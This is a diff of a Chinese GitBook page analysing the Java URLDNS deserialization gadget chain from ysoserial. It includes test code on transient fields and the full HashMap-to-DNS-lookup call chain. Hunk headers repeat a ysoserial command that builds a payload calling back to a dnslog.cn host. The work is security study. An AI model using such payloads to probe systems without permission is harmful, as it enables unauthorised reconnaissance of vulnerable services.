-<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210808103821534.png" data-lightbox="71d5bfd0-eff9-4304-a309-dec6bc50ef75" data-title="image-20210808103821534"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210808103821534.png" alt="image-20210808103821534"></a></p>
+<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210808103821534.png" data-lightbox="a7b12954-d5f0-44e1-bb5d-126fd7421936" data-title="image-20210808103821534"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210808103821534.png" alt="image-20210808103821534"></a></p>
 <p>&#x6210;&#x529F;&#x83B7;&#x53D6;&#x5230;&#x4E86;DNS&#x89E3;&#x6790;&#x8BF7;&#x6C42;&#x8BB0;&#x5F55;&#x3002;</p>
 <p>&#x90A3;&#x4E48;&#x4E3A;&#x4EC0;&#x4E48;<code>ysoserial</code>&#x5728;&#x751F;&#x6210;&#x5E8F;&#x5217;&#x5316;&#x6570;&#x636E;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4E5F;&#x8C03;&#x7528;&#x4E86;<code>put</code>&#x65B9;&#x6CD5;&#xFF0C;&#x4F46;&#x662F;&#x6CA1;&#x6709;&#x6536;&#x5230;DNS&#x89E3;&#x6790;&#x8BB0;&#x5F55;&#x5462;&#xFF1F;</p>
 <p>&#x539F;&#x56E0;&#x5C31;&#x5728;&#x4E8E;&#x7EE7;&#x627F;&#x62BD;&#x8C61;&#x7C7B;<code>URLStreamHandler</code>&#x7684;<code>SilentURLStreamHandler</code>&#x7C7B;&#x4E2D;&#xFF0C;&#x91CD;&#x5199;&#x4E86;<code>openConnection</code>&#x548C;<code>getHostAddress</code></p>
-<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210808104022366.png" data-lightbox="69cb0197-d090-4bcf-b07c-cce1df800531" data-title="image-20210808104022366"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210808104022366.png" alt="image-20210808104022366"></a></p>
+<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210808104022366.png" data-lightbox="0b9032b3-8e84-4ecf-94bc-7682b10cb2dc" data-title="image-20210808104022366"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210808104022366.png" alt="image-20210808104022366"></a></p>
 <p>&#x56E0;&#x6B64;&#x5728;&#x8C03;&#x7528; <code>put</code> &#x65B9;&#x6CD5;&#x7684;&#x65F6;&#x5019;&#x4E0D;&#x4F1A;&#x89E6;&#x53D1; dns &#x67E5;&#x8BE2;&#x3002;</p>
 <p>&#x8FDB;&#x884C;&#x5C1D;&#x8BD5;&#x91CD;&#x5199;&#x4E86;<code>openConnection</code>&#x548C;<code>getHostAddress</code>&#xFF0C;&#x53D1;&#x73B0;&#x786E;&#x5B9E;&#x4E0D;&#x80FD;&#x6536;&#x5230;dns&#x67E5;&#x8BE2;&#x8BB0;&#x5F55;&#x3002;</p>
 <pre class="language-"><code class="lang-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>
@@ -4884,7 +4871,7 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://urldns.epraqr.dnslog.cn
 <p>&#x6211;&#x4EEC;&#x90FD;&#x77E5;&#x9053;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x53EA;&#x8981;&#x5B9E;&#x73B0;&#x4E86;Serilizable&#x63A5;&#x53E3;&#xFF0C;&#x8FD9;&#x4E2A;&#x5BF9;&#x8C61;&#x5C31;&#x53EF;&#x4EE5;&#x88AB;&#x5E8F;&#x5217;&#x5316;&#xFF0C;java&#x7684;&#x8FD9;&#x79CD;&#x5E8F;&#x5217;&#x5316;&#x6A21;&#x5F0F;&#x4E3A;&#x5F00;&#x53D1;&#x8005;&#x63D0;&#x4F9B;&#x4E86;&#x5F88;&#x591A;&#x4FBF;&#x5229;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4E0D;&#x5FC5;&#x5173;&#x7CFB;&#x5177;&#x4F53;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x53EA;&#x8981;&#x8FD9;&#x4E2A;&#x7C7B;&#x5B9E;&#x73B0;&#x4E86;Serilizable&#x63A5;&#x53E3;&#xFF0C;&#x8FD9;&#x4E2A;&#x7C7B;&#x7684;&#x6240;&#x6709;&#x5C5E;&#x6027;&#x548C;&#x65B9;&#x6CD5;&#x90FD;&#x4F1A;&#x81EA;&#x52A8;&#x5E8F;&#x5217;&#x5316;&#x3002;</p>
 <p>&#x7136;&#x800C;&#x5728;&#x5B9E;&#x9645;&#x5F00;&#x53D1;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x5E38;&#x5E38;&#x4F1A;&#x9047;&#x5230;&#x8FD9;&#x6837;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x8FD9;&#x4E2A;&#x7C7B;&#x7684;&#x6709;&#x4E9B;&#x5C5E;&#x6027;&#x9700;&#x8981;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x800C;&#x5176;&#x4ED6;&#x5C5E;&#x6027;&#x4E0D;&#x9700;&#x8981;&#x88AB;&#x5E8F;&#x5217;&#x5316;&#xFF0C;&#x6253;&#x4E2A;&#x6BD4;&#x65B9;&#xFF0C;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x7528;&#x6237;&#x6709;&#x4E00;&#x4E9B;&#x654F;&#x611F;&#x4FE1;&#x606F;&#xFF08;&#x5982;&#x5BC6;&#x7801;&#xFF0C;&#x94F6;&#x884C;&#x5361;&#x53F7;&#x7B49;&#xFF09;&#xFF0C;&#x4E3A;&#x4E86;&#x5B89;&#x5168;&#x8D77;&#x89C1;&#xFF0C;&#x4E0D;&#x5E0C;&#x671B;&#x5728;&#x7F51;&#x7EDC;&#x64CD;&#x4F5C;&#xFF08;&#x4E3B;&#x8981;&#x6D89;&#x53CA;&#x5230;&#x5E8F;&#x5217;&#x5316;&#x64CD;&#x4F5C;&#xFF0C;&#x672C;&#x5730;&#x5E8F;&#x5217;&#x5316;&#x7F13;&#x5B58;&#x4E5F;&#x9002;&#x7528;&#xFF09;&#x4E2D;&#x88AB;&#x4F20;&#x8F93;&#xFF0C;&#x8FD9;&#x4E9B;&#x4FE1;&#x606F;&#x5BF9;&#x5E94;&#x7684;&#x53D8;&#x91CF;&#x5C31;&#x53EF;&#x4EE5;&#x52A0;&#x4E0A;<code>transient</code>&#x5173;&#x952E;&#x5B57;&#x3002;</p>
 <p>&#x4E5F;&#x5C31;&#x662F;&#x8BF4;<strong><code>transient</code>&#x4FEE;&#x9970;&#x7B26;&#x65E0;&#x6CD5;&#x88AB;&#x5E8F;&#x5217;&#x5316;</strong>&#xFF0C;&#x6240;&#x4EE5;&#x867D;&#x7136;&#x5B83;&#x6700;&#x540E;&#x662F;&#x6CA1;&#x6267;&#x884C;dns&#x8BF7;&#x6C42;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x65F6;&#x5019;&#x8FD8;&#x662F;&#x4F1A;&#x6267;&#x884C;dns&#x8BF7;&#x6C42;</p>
-<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210808104722031.png" data-lightbox="1c08f91d-b71b-49a1-b09f-922db201eba7" data-title="image-20210808104722031"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210808104722031.png" alt="image-20210808104722031"></a></p>
+<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210808104722031.png" data-lightbox="e88f13b4-8267-4e0d-9a52-9f5ee8658d7a" data-title="image-20210808104722031"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210808104722031.png" alt="image-20210808104722031"></a></p>
 <p>&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;<code>transient</code></p>
 <pre class="language-"><code class="lang-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>
 
@@ -4916,9 +4903,9 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://urldns.epraqr.dnslog.cn
     <span class="token keyword">transient</span> <span class="token keyword">public</span> <span class="token class-name">String</span> test<span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 </code></pre>
-<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210808143905639.png" data-lightbox="b8fa3df8-bb16-421d-ba6e-9ae03ba0038d" data-title="image-20210808143905639"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210808143905639.png" alt="image-20210808143905639"></a></p>
+<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210808143905639.png" data-lightbox="30422bc5-f474-4d1f-b238-94e1d1ec6c04" data-title="image-20210808143905639"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210808143905639.png" alt="image-20210808143905639"></a></p>
 <p>&#x53EF;&#x89C1;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x540E;&#x7684;&#x503C;&#x4E3A;<code>null</code>&#xFF0C;&#x8BF4;&#x660E;&#x5E8F;&#x5217;&#x5316;&#x65F6;&#x5E76;&#x6CA1;&#x6709;&#x5C06;<code>test</code>&#x5BF9;&#x5E94;&#x7684;&#x503C;&#x4EE3;&#x5165;&#x8FDB;&#x53BB;&#x3002;</p>
-<h2 id="&#x603B;&#x7ED3;"><a name="&#x603B;&#x7ED3;" class="anchor-navigation-ex-anchor" href="#&#x603B;&#x7ED3;"><i class="fa fa-link" aria-hidden="true"></i></a>1.5. &#x603B;&#x7ED3;</h2>
+<h2 id="&#x603B;&#x7ED3;">&#x603B;&#x7ED3;</h2>
 <p>&#x8FD9;&#x6761;&#x94FE;&#x8FD8;&#x662F;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#x7684;&#xFF0C;&#x4E3B;&#x8981;&#x662F;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8FC7;&#x7A0B;&#x4E2D;<code>HashMap</code>&#x7684;Key&#x4F1A;&#x8FDB;&#x884C;<code>Key.HashCode()</code>&#x8BA1;&#x7B97;&#xFF0C;&#x5982;&#x679C;<code>Key</code>&#x4F20;&#x5165;&#x7684;&#x662F;<code>URL(URL context, String spec, URLStreamHandler handler)</code>&#x7C7B;&#x578B;&#xFF08;&#x91CD;&#x5199;<code>URLStreamHandler</code>&#x907F;&#x514D;&#x6709;&#x591A;&#x4F59;&#x7684;DNS&#x8BF7;&#x6C42;&#xFF09;&#xFF0C;&#x5728;&#x8BA1;&#x7B97;<code>hashCode()</code>&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x4F1A;&#x8C03;&#x7528;<code>URLStreamHandler.hashCode()</code>&#x89E6;&#x53D1;<code>getHost</code>&#x65B9;&#x6CD5;&#x5BF9;&#x76EE;&#x6807;&#x8FDB;&#x884C;DNS&#x89E3;&#x6790;&#x3002;</p>
 <p>&#x4E3E;&#x4E2A;&#x4F8B;&#x5B50;&#xFF1A;</p>
 <pre class="language-"><code class="lang-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>
@@ -4947,7 +4934,7 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://urldns.epraqr.dnslog.cn
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span>
 </code></pre>
-<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807211449064.png" data-lightbox="3d7304ad-07c3-4662-9bee-5e4fdf664afb" data-title="image-20210807211449064"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807211449064.png" alt="image-20210807211449064"></a></p>
+<p><a href="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807211449064.png" data-lightbox="6d2c4565-cc48-4ed8-bf4c-ac2ba20aaf2f" data-title="image-20210807211449064"><img src="URLDNS&#x94FE;&#x5206;&#x6790;.assets/image-20210807211449064.png" alt="image-20210807211449064"></a></p>
 <p>&#x6574;&#x4E2A;&#x8C03;&#x7528;&#x94FE;&#x5982;&#x4E0B;&#xFF1A;</p>
 <pre class="language-"><code class="lang-java"><span class="token class-name">HashMap</span><span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span>  <span class="token class-name">HashMap</span><span class="token punctuation">.</span><span class="token function">putVal</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token class-name">HashMap</span><span class="token punctuation">.</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token operator">-&gt;</span> URL<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token class-name">URLStreamHandler</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getHostAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token class-name">URLStreamHandler</span><span class="token punctuation">.</span><span class="token function">getHostAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>InetAddress<span class="token punctuation">.</span><span class="token function">getByName</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 </code></pre>
@@ -4958,10 +4945,10 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://urldns.epraqr.dnslog.cn
 </ul>
 <footer class="page-footer"><span class="copyright">Copyright &#xA9; d4m1ts 2023 all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x8BE5;&#x6587;&#x7AE0;&#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A;
 2021-12-25 18:52:00
-</span></footer></body></html>
-                                
-                                </section>
-                            
+</span></footer>
+                        
+                    </section>
+                    
     </div>
     <div class="search-results">
         <div class="has-results">
@@ -4978,30 +4965,29 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://urldns.epraqr.dnslog.cn
     </div>
 </div>
 
-                        </div>
-                    </div>
-                
+                </div>
             </div>
+            
+        </div>
 
-            
-                
-                <a href="01.Apache_Commons_Collections中的反序列化.html" class="navigation navigation-prev " aria-label="Previous page: 01.Apache_Commons_Collections中的反序列化">
-                    <i class="fa fa-angle-left"></i>
-                </a>
-                
-                
-                <a href="03.ysoserial-C3P0分析.html" class="navigation navigation-next " aria-label="Next page: 03.ysoserial-C3P0分析">
-                    <i class="fa fa-angle-right"></i>
-                </a>
-                
-            
+        
+        
+        <a href="01.Apache_Commons_Collections中的反序列化.html" class="navigation navigation-prev " aria-label="Previous page: 01.Apache_Commons_Collections中的反序列化">
+            <i class="fa fa-angle-left"></i>
+        </a>
+        
+        
+        <a href="03.ysoserial-C3P0分析.html" class="navigation navigation-next " aria-label="Next page: 03.ysoserial-C3P0分析">
+            <i class="fa fa-angle-right"></i>
+        </a>
+        
+        
         
     </div>
-
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"02.URLDNS链分析","level":"1.3.1.2.2","depth":4,"next":{"title":"03.ysoserial-C3P0分析","level":"1.3.1.2.3","depth":4,"path":"个人知识库/02.代码审计/01.Java安全/02.反序列化链分析/03.ysoserial-C3P0分析.md","ref":"个人知识库/02.代码审计/01.Java安全/02.反序列化链分析/03.ysoserial-C3P0分析.md","articles":[]},"previous":{"title":"01.Apache_Commons_Collections中的反序列化","level":"1.3.1.2.1","depth":4,"path":"个人知识库/02.代码审计/01.Java安全/02.反序列化链分析/01.Apache_Commons_Collections中的反序列化.md","ref":"个人知识库/02.代码审计/01.Java安全/02.反序列化链分析/01.Apache_Commons_Collections中的反序列化.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","-highlight","chapter-fold","expandable-chapters","splitter","page-treeview","lightbox","donate","hide-element","code","tbfed-pagefooter","pageview-count","ancre-navigation","anchor-navigation-ex","insert-logo","favicon","github","flexible-alerts","prism","auto-scroll-table","d4test","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"Copyright &copy d4m1ts 2023","modify_label":"该文章修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"page-treeview":{"collapsed":false,"copyright":"Copyright &#169; d4m1ts","minHeaderCount":"2","minHeaderDeep":"2"},"chapter-fold":{},"prism":{"css":["prismjs/themes/prism-tomorrow.css"],"lang":{"flow":"typescript"},"ignore":["mermaid","eval-js","ascii","result","manifest","payload","google","tree","java_out","log4j2","jsp","class","Exception","stack","c#","xml-dtd","C++","twig","jinja2","exception","tpl"]},"d4test":{},"github":{"url":"https://github.com/damit5"},"livereload":{},"splitter":{},"auto-scroll-table":{},"code":{"copyButtons":true},"donate":{"alipay":"/README.assets/gzh_1.png","alipayText":"点点广告🙏","button":"支持作者","title":"","wechat":"/README.assets/gzh_0.png","wechatText":"关闭Adblock"},"hide-element":{"elements":[".gitbook-link",".treeview__copyright",".treeview__main-title"]},"fontsettings":{"theme":"white","family":"sans","size":2},"anchor-navigation-ex":{"associatedWithSummary":true,"float":{"floatIcon":"fa fa-navicon","level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":true},"favicon":{"shortcut":"/README.assets/favicon.ico","bookmark":"/README.assets/favicon.ico","appleTouch":"/README.assets/favicon.ico","appleTouchMore":{"120x120":"/README.assets/favicon.ico","180x180":"/README.assets/favicon.ico"}},"lightbox":{"jquery":true,"sameUuid":false},"pageview-count":{},"ancre-navigation":{"associatedWithSummary":true,"float":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showLevel":true},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"},"comment":{"label":"Comment","icon":"fa fa-comments","className":"info"}},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"insert-logo":{"style":"background: none; max-height: 40px; min-height: 40px","url":"/README.assets/logo.png"},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"d4m1ts","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"d4m1ts 知识库","gitbook":"*","description":"个人的部分知识技能，倾向于使用知识库的方式进行总结回顾自己","theme-default":{"showLevel":true}},"file":{"path":"个人知识库/02.代码审计/01.Java安全/02.反序列化链分析/02.URLDNS链分析.md","mtime":"2021-12-25T10:52:00.397Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-05-30T05:54:54.906Z"},"basePath":"../../../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"02.URLDNS链分析","level":"1.3.1.2.2","depth":4,"next":{"title":"03.ysoserial-C3P0分析","level":"1.3.1.2.3","depth":4,"path":"个人知识库/02.代码审计/01.Java安全/02.反序列化链分析/03.ysoserial-C3P0分析.md","ref":"个人知识库/02.代码审计/01.Java安全/02.反序列化链分析/03.ysoserial-C3P0分析.md","articles":[]},"previous":{"title":"01.Apache_Commons_Collections中的反序列化","level":"1.3.1.2.1","depth":4,"path":"个人知识库/02.代码审计/01.Java安全/02.反序列化链分析/01.Apache_Commons_Collections中的反序列化.md","ref":"个人知识库/02.代码审计/01.Java安全/02.反序列化链分析/01.Apache_Commons_Collections中的反序列化.md","articles":[]},"dir":"ltr"},"config":{"plugins":["splitter","hide-element","code","theme-d4t","-lunr","-search","-sharing","search-pro-fixed","-highlight","chapter-fold","expandable-chapters","lightbox","donate","tbfed-pagefooter","github","flexible-alerts","prism","back-to-top-button","auto-scroll-table","d4test","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"theme-d4t":{},"tbfed-pagefooter":{"copyright":"Copyright &copy d4m1ts 2023","modify_label":"该文章修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"chapter-fold":{},"prism":{"css":["prismjs/themes/prism-tomorrow.css"],"lang":{"flow":"typescript"},"ignore":["mermaid","eval-js","ascii","result","manifest","payload","google","tree","java_out","log4j2","jsp","class","Exception","stack","c#","xml-dtd","C++","twig","jinja2","exception","tpl"]},"d4test":{},"github":{"url":"https://github.com/damit5"},"d4t":{"search-placeholder":"请输入关键字搜索","logo":"/README.assets/logo.svg","favicon":"/README.assets/favicon.ico"},"livereload":{},"splitter":{},"auto-scroll-table":{},"code":{"copyButtons":true},"search-pro-fixed":{},"donate":{"alipay":"/README.assets/gzh_1.png","alipayText":"点点广告🙏","button":"支持作者","title":"","wechat":"/README.assets/gzh_0.png","wechatText":"关闭Adblock"},"hide-element":{"elements":[".gitbook-link",".treeview__copyright",".treeview__main-title"]},"fontsettings":{"theme":"white","family":"sans","size":2},"lightbox":{"jquery":true,"sameUuid":false},"back-to-top-button":{},"flexible-alerts":{"danger":{"className":"danger","icon":"fa fa-ban","label":"Attention"},"note":{"className":"info","icon":"fa fa-info-circle","label":"Note"},"style":"callout","tip":{"className":"tip","icon":"fa fa-lightbulb-o","label":"Tip"},"warning":{"className":"warning","icon":"fa fa-exclamation-triangle","label":"Warning"},"comment":{"label":"Comment","icon":"fa fa-comments","className":"info"}},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"d4m1ts","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{"d4t":{"nav":[{"url":"https://markdown.gm7.org/","target":"_blank","name":"markdown在线"},{"url":"https://rshell.gm7.org/","target":"_blank","name":"Reverse Shell Generator"}]}},"title":"","gitbook":"*","description":"个人的部分知识技能，倾向于使用知识库的方式进行总结回顾自己","theme-default":{"showLevel":true}},"file":{"path":"个人知识库/02.代码审计/01.Java安全/02.反序列化链分析/02.URLDNS链分析.md","mtime":"2021-12-25T10:52:00.397Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-05-31T10:06:32.950Z"},"basePath":"../../../..","book":{"language":""}});
         });
     </script>
 </div>
@@ -5011,31 +4997,7 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://urldns.epraqr.dnslog.cn
     <script src="../../../../gitbook/theme.js"></script>
     
         
-        <script src="../../../../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
-        
-    
-        
-        <script src="../../../../gitbook/gitbook-plugin-search-plus/search.js"></script>
-        
-    
-        
-        <script src="../../../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.js"></script>
-        
-    
-        
-        <script src="../../../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
-        
-    
-        
         <script src="../../../../gitbook/gitbook-plugin-splitter/splitter.js"></script>
-        
-    
-        
-        <script src="../../../../gitbook/gitbook-plugin-lightbox/js/lightbox.min.js"></script>
-        
-    
-        
-        <script src="../../../../gitbook/gitbook-plugin-donate/plugin.js"></script>
         
     
         
@@ -5047,11 +5009,27 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://urldns.epraqr.dnslog.cn
         
     
         
-        <script src="../../../../gitbook/gitbook-plugin-pageview-count/plugin.js"></script>
+        <script src="../../../../gitbook/gitbook-plugin-search-pro-fixed/jquery.mark.min.js"></script>
         
     
         
-        <script src="../../../../gitbook/gitbook-plugin-insert-logo/plugin.js"></script>
+        <script src="../../../../gitbook/gitbook-plugin-search-pro-fixed/search.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-lightbox/js/lightbox.min.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-donate/plugin.js"></script>
         
     
         
@@ -5060,6 +5038,10 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://urldns.epraqr.dnslog.cn
     
         
         <script src="../../../../gitbook/gitbook-plugin-flexible-alerts/plugin.js"></script>
+        
+    
+        
+        <script src="../../../../gitbook/gitbook-plugin-back-to-top-button/plugin.js"></script>
         
     
         
@@ -5083,11 +5065,11 @@ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://urldns.epraqr.dnslog.cn
         
     
         
-        <script src="../../../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        <script src="../../../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
         
     
         
-        <script src="../../../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        <script src="../../../../gitbook/gitbook-plugin-theme-d4t/script.js"></script>
         
     
 
